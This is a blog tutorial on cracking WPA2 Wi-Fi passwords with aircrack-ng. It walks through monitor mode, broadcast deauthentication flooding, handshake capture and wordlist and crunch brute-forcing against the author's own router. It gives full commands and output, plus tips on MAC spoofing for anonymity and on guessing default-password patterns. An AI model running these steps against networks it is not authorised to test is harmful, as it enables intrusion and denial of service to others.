+++
title = "Wifi Hacking with aircrack-ng"
summary = "A guide to using aircrack-ng to bruteforce a router's password"
date = "2019-09-26"
categories = ["Cybersecurity"]
keywords = ["aircrack-ng", "wifi hacking", "wireless security", "WPA cracking", "network penetration testing", "Kali Linux", "wireless penetration testing", "WEP cracking", "monitor mode", "cybersecurity tutorial"]
ShowToc = true
TocOpen = true
+++

## Introduction

> This post is an organized re-write of notes I took in 2017. As such, this guide may now be outdated.

I used [Kali Linux](https://www.kali.org/) for the entire process, but the process should be very similar for any Linux distribution. `aircrack-ng` is already included on Kali Linux but you can install it on any Linux OS.

> **Disclaimer**: This is purely for educational purposes. Do not try to break into access points that do not belong to you.

## What is aircrack-ng?

`aircrack-ng` is a complete suite of tools to assess WiFi network security. It can be used to scan wifi signals and to perform denial-of-service (DOS) attacks among other things. Read more about it on the [official aircrack-ng website](https://www.aircrack-ng.org/).

The goal in this post is to use the tools included in `aircrack-ng` to:
1. Scan for nearby routers
2. Send spoofed deauthentication packets on behalf of a connected client
3. Capture the 4-way handshake hash
4. Crack the hash, which reveals the password of the router in plaintext

## Hardware requirements

To use `aircrack-ng` you'll need a wireless network adapter that has monitor mode and packet injection capabilities. Feel free to do some research about your particular card and it's compatibility. There's a good guide on [the aircrack-ng site](https://www.aircrack-ng.org/doku.php?id=compatible_cards) that can help you with research. You can also do what I did and buy a cheap USB wireless adapter with these capabilities. I have the [Panda Wireless N600](https://www.amazon.com/Panda-2-4GHz-300Mbps-Wireless-Adapter/dp/B00U2SIS0O/) and it works perfectly fine on my Macbook Pro.

## Installation

If you're not on Kali Linux, `aircrack-ng` is most likely available through your preferred package manager. For Windows users, refer to the [official aircrack-ng site](https://www.aircrack-ng.org/) to download the suite. On MacOS using [Homebrew](https://brew.sh/) you can run `brew install aircrack-ng`

## Setting up monitor mode

We'll need to set up monitor mode in our wireless network adapter. Monitor mode allows the wireless network interface to capture all wireless traffic. This means we'll be able to see nearby wireless access points and devices connected to each one.

To set the network adapter to monitor mode, first find the name of the interface as your system detects it. You can see this using `ifconfig`. In my case, the interface name of my USB wireless adapter is `wlan0`. I can set it to monitor mode using the following commands:

```
$ ifconfig wlan0 down

$ iwconfig wlan0 mode monitor

$ ifconfig wlan0 up
```

Now, we need to check that no processes interfere with the `airmon-ng` tool, which is part of the `aircrack-ng` suite. To do this, run:

```
$ airmon-ng check wlan0
```

You'll get an output similar to the following:

```
Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

 PID Name
 1229 NetworkManager
 1329 wpa_supplicant
 3383 dhclient
```

We'll need to kill all those processes to prevent any issues. Simply issue `kill` commands for each process ID. Run `airmon-ng check` once again to be sure that all is well. We are now ready to scan for access points.

## Scanning for access points

To run a wireless scan using a particular interface, run the following command:

```
$ airodump-ng wlan0
```

Your terminal screen will fill up with something like this:

```
 CH 10 ][ Elapsed: 0 s ][ 2019-09-27 21:57

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 51:EF:63:2E:47:72  -55        0        0    0   3  -1                    <length:  0>
 7C:B1:DF:B9:12:59  -42        3        0    0   7  130  WPA2 CCMP   PSK  Lower The Rent
 DA:4B:77:1A:84:50  -75        2        0    0   1  195  WPA2 CCMP   PSK  Spectrum
 19:7H:8D:73:97:FE  -77        2        0    0   1  195  WPA2 CCMP   PSK  MyWifi
 DA:F4:AC:DC:31:A7  -75        2        0    0   1  130  WPA2 CCMP   PSK  Home
 19:AD:EF:C4:0A:36  -71        3        0    0   1  195  WPA2 CCMP   PSK  Verizon
 5D:19:32:EA:E0:66  -62        3        0    0   1  360  WPA2 CCMP   PSK  Cali
 F5:10:4E:EA:E0:63  -62        3        0    0   1  360  WPA2 CCMP        <length:  0>
 A2:72:C3:EA:E0:69  -62        3        0    0   1  360  OPN              <length:  0>
 9D:58:61:62:68:21  -63        3        0    0   1  130  WPA2 CCMP   PSK  INTERNET
 ED:3D:D4:64:A4:6C  -79        2        0    0   1   65  WPA2 CCMP   PSK  OfficeJet
 33:B5:E2:92:08:33  -66        4        0    0   9  260  OPN              Test-guest

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   88:D6:CD:88:4C:9D  -47    0 - 1     95        5
 (not associated)   93:1E:44:10:82:3A  -63    0 - 1      0        2
 7C:B1:DF:B9:12:59  49:12:C4:53:EF:4A  -29    0 - 1      0        1
```

You'll see a list of access points and devices associated with each access point. You'll notice there are acronyms above each column. Here's a list of the ones we care about and what they mean:

- BSSID - MAC Address of the access point
- PWR - Strength of the signal. The closer to 0, the better
- CH - Channel
- ESSID - Name of access point
- STATION - Device connected to access point (Laptop, smartphone, etc)

Now lets select an access point and run a scan on only that particular device. We'll capture traffic and save it to a file. You'll need to make note of the BSSID and channel of the access point. In my case, my router's ESSID is "Lower The Rent". We'll scan it using the following command formula:

```
$ airodump-ng -c [channel number] -w [filename for output] --bssid [MAC Address of A.P.] [your interface]
```

In my case, the full command looks like this:

```
$ airodump-ng -c 7 -w SCAN_OUTPUT --bssid 7C:B1:DF:B9:12:59 wlan0
```

Here's the output:

```
 CH  7 ][ Elapsed: 24 s ][ 2019-09-27 22:05

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 7C:B1:DF:B9:12:59  -47 100      231       92    0   7  130  WPA2 CCMP   PSK  Lower The Rent

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 7C:B1:DF:B9:12:59  49:12:C4:53:EF:4A  -31    0e- 1      0      130
```

You'll be able to see the access point and associated devices. This provides a much cleaner look instead of your terminal screen being full of information. We can see that there is a single device associated with the access point.

Now we can commence an attack.

## Attacking an access point

We'll be flooding the access point with deauthentication frames to keep devices from reconnecting to it. As they try to reconnect, we'll be able to capture the 4-way handshake. This can also be used to simply perform DOS attacks on an access point. Keep in mind you won't be able to capture the handshake if there are no devices associated to the access point. If there are no devices associated, there is nothing conducting the authentication process which you can capture.

While leaving the previous `airodump-ng` command running in a separate tab or window, open another tab to run the deauthentication command. The command is as follows:

```
$ aireplay-ng -0 0 -a 7C:B1:DF:B9:12:59 wlan0
```

The BSSID we specify is that of the access point. It is possible to limit the amount of deauthentication frames to send, but in this case we are sending an infinite amount specified with `-0 0`.

The output for the `aireplay-ng` command will look like this:

```
03:24:06  Waiting for beacon frame (BSSID: 7C:B1:DF:B9:12:59) on channel 7
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
03:24:06  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [7C:B1:DF:B9:12:59]
```

Your terminal screen will continue to fill with these messages. Keep the command running until you see a `WPA handshake: XX:XX:XX:XX:XX:XX` message on the upper right of the first window running the `airodump-ng` command. That window will look as follows (notice the message on the upper right):

```
 CH  7 ][ Elapsed: 1 min ][ 2019-09-28 03:25 ][ WPA handshake: 7C:B1:DF:B9:12:59

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 7C:B1:DF:B9:12:59  -44  96      871       96    0   7  130  WPA2 CCMP   PSK  Lower The Rent

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 7C:B1:DF:B9:12:59  49:12:C4:53:EF:4A  -41    1e- 1      0       78
```

If you see the message, you have successfully captured the handshake. The last step left to do now is to crack this handshake and reveal the password in plaintext.

## Cracking the password

Recall that we saved our `airodump-ng` scan to a file named `SCAN_OUTPUT`. You'll see several files in the directory by the same name, but you'll only need the one with a `.cap` extension. From here, there are two approaches to cracking the password. You can use a wordlist and see if one of the passwords in the wordlist is the actual password to the access point, or you can opt to use a program that generates passwords and attempts each one (brute forcing).

First, we'll go over the approach using a wordlist. The command to begin cracking using a wordlist is as follows:

```
$ aircrack-ng -w wordlist.txt SCAN_OUTPUT.cap
```

In my case, I used a short wordlist of 4800 passwords to try and crack the handshake. I was not able to find the key, but this is what the output will look like:

```
                              Aircrack-ng 1.5.2

      [00:00:00] 4800/4799 keys tested (5047.82 k/s)

      Time left: 0 seconds                                     100.02%

                                KEY NOT FOUND

      Master Key     : 8B BB 3C 7A 08 50 43 73 73 BC 27 A0 A0 20 C2 C4
                       F8 82 0E 55 32 29 28 4C 93 CD 4D C0 3E E3 9C 4C

      Transient Key  : DE 14 79 DB 14 3B ED 7A 0D 80 FC DA 67 77 5C 09
                       C7 95 27 0C AC 2A 3B 2B 08 5F B5 22 B5 F6 F7 0F
                       C5 50 68 68 85 00 1E 80 33 1B F8 D9 FE E2 5B F4
                       71 EE D0 87 E4 57 ED 21 2D 66 CC 0B A7 A7 0D 1D

      EAPOL HMAC     : 35 D8 56 95 03 0B DF 6B 48 C4 DE 21 DB 01 7F E7
```

The tool will go through every password in the wordlist and try to crack the acess point's password. Wordlists are convenient and can be fast, but if the password is not in the wordlist itself, we'll need to try bruteforcing.

There are likely several tools out there that can generate password combinations, but I used `crunch`. The formula to feed passwords generated by `crunch` into `aircrack-ng` is as follows (notice we need to specify the ESSID this time):

```
$ crunch [min password length] [max password length] [characters to use] | aircrack-ng -w - [filename.cap] -e [ESSID]
```

I already know the length of the passowrd to my own router. My full command looks like this:

```
$ crunch 14 14 abcdefghijklmnopqrstuvwxyz 1234567890 | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\ Rent
```

This will be very slow, as the program will attempt every 14-character letter and number combination possible.

In my case, my router has the default password of `pinkcoconut165`. With this knowledge, I can specify further. Instead of attempting a random mix of letters and numbers, I can test for a specific arrangement of letters/numbers. Obviously, this would not be known if we were attacking a completely unknown access point, but I want to demonstrate what a successful crack looks like. Using the `-t` option we can specify a pattern. Here's the description from the `man` page:

```
-t @,%^
      Specifies a pattern, eg: @@god@@@@ where the only the @'s, ,'s, %'s, and ^'s will change.
      @ will insert lower case characters
      , will insert upper case characters
      % will insert numbers
      ^ will insert symbols
```

With this flag, we can modify our command as follows:

```
$ crunch 14 14 -t @@@@@@@@@@@%%%  | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\ Rent
```

This will still take long, however, due to the length of the password. Let's cheat a little bit just to show the success screen. Here's the new command where we will type in the letters of the password and only try to guess the remaining digits:

```
crunch 14 14 -t pinkcoconut%%% | aircrack-ng -w - SCAN_OUTPUT.cap -e Lower\ The\ Rent
```

Success! The password has been found:

```
                              Aircrack-ng 1.5.2


                   [00:00:03] 842 keys tested (262.68 k/s)


                        KEY FOUND! [ pinkcoconut165 ]


      Master Key     : 1C 7E B9 AE 6E 96 C3 29 A1 CC 8F 70 CE 3D 41 46
                       6A 02 A6 A3 82 E8 19 D8 34 12 E2 62 A6 79 8B C7

      Transient Key  : C1 FA BC A8 1E 15 B9 3F 7C 59 AA 00 8D 6F 9A C1
                       F8 D6 F2 A1 BB 8A 0F 71 05 D1 C0 89 88 34 04 CC
                       5A 10 EF FF 77 08 13 EF CA 8B 10 53 31 5E 65 20
                       A9 A8 25 7A 37 AA A8 A4 BD 67 6F E4 F9 36 14 C4

      EAPOL HMAC     : 92 FB C9 F7 B9 1B 60 B1 82 9B 90 BA 03 EF E4 83
```

## Additional Tips

### Changing Your MAC Address

If you want to stay as anonymous as possible, you can change your MAC Address before attempting any of this. You can easily do this using a tool like `macchanger`. The following command will assign a randomized MAC address to the `wlan0` interface:

```
$ macchanger -r wlan0
```

We can be more clever and use a MAC address from a known company. The first 3 bytes of a MAC address are known as the Organizationally Unique Identifier (OUI) and can identify the manufacturer. For example, some of Dell's devices have the first 3 bytes as `F8:DB:88`. The last 3 bytes can be anything, as long as it is within the range of A-F and 0-9 (hexadecimal values).

We can specify a MAC address with the following command:

```
$ macchanger -m f8:d8:88:64:fd:c7 wlan0
```

On macOS you can change the MAC address of an interface to one of your choosing with the following command:

```
$ sudo ifconfig wlan0 ether f8-db-88-e4-94-5d
```

Using this knowledge of MAC Addresses, we can also determine the manufacturers of the access points we scan. We can look up the MAC addresses, figure out the manufacturer, and see if there are other vulnerabilities with specific device models. Maybe we'll discover their formula for default passwords (which lots of people never change) to be, say, a combination of 5 letters and 5 numbers, which can help us crack the password. Any hint helps. Additionally, default ESSID names, such as "NETGEAR23-2G", could mean that the user never changed the default password either ;).

### Password Lists

Password lists are often used in password cracking to speed up the process. Instead of trying every possible combination of characters, we can try our luck using leaked passwords from one of these lists. A good place to find passwords lists and more is the [SecLists GitHub repo](https://github.com/danielmiessler/SecLists). To start off, I suggest trying one of the ["Common Credentials" lists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).

Password lists can be used along with the `crunch` tool we used earlier. `crunch` has much more functionality that I did not dive into. I encourage you to read through the `man` pages and learn more about it. It's versatile but still easy to pick up.

## Conclusions

In this post I covered how to use `aircrack-ng` to scan for nearby access points, capture the 4-way handshake by sending spoofed deauthentication packets, and crack the hash using `crunch`. Once again, only try this on devices you own!

Scanning for wifi networks and acquiring handshakes is not too difficult. Anyone with some command line experience can achieve this. The hardest part will be cracking the password itself due to processing power required.

This is an example of why long passwords are important. It is not enough to add symbols to a short password. In fact, it is better to get into the habit of creating pass-*phrases* as opposed to pass-*words*. A combination of words with lowercase and capital letters in addition so symbols will be more secure than a single word with symbols. In other words, `!ThisIsALongPassword123?` is much harder to crack than `Password123?`

There are other tools that we could have used to crack the password, such as `hashcat`. If I'm not mistaken, `hashcat` can take advantage of a GPU which will allow you to crack passwords much faster. However, I wanted to focus on the tools that come with the `aircrack-ng` suite.

This concludes my wifi hacking notes, I hope you learned something!
